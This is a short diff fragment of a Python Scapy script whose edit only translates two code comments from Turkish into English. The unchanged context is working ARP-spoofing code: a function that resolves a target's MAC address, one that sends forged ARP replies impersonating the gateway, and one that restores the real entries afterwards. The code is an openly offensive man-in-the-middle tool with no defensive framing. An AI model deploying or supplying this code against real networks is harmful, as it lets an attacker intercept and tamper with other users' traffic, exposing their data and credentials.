@@ -16,12 +16,12 @@ def main():
             arp_packet = Ether(dst = 'ff:ff:ff:ff:ff:ff')/ARP(op=1, pdst=trg_ip)
             trg_mac = srp(arp_packet, timeout = 2, verbose = False)[0][0][1].hwsrc
             return trg_mac
-            #source ip hedefin zannedecegi gateway olacak
+            #gatewayy spoof
         def arp_spoof(trg_ip, trg_mac, src_ip):
             spoof = ARP(op = 2, pdst = trg_ip, psrc = src_ip, hwdst = trg_mac)
             send(spoof, verbose = False)
 
-        #Burada ise arp spoof durdugun da eskı haline getirelim
+        #return back arpspoof
         def no_arp_spoof(trg_ip, trg_mac, src_ip, src_mac):
             packet = ARP(op=2, hwsrc = src_mac, psrc = src_ip, hwdst = trg_mac, pdst = trg_ip)
             send(packet, verbose=False)
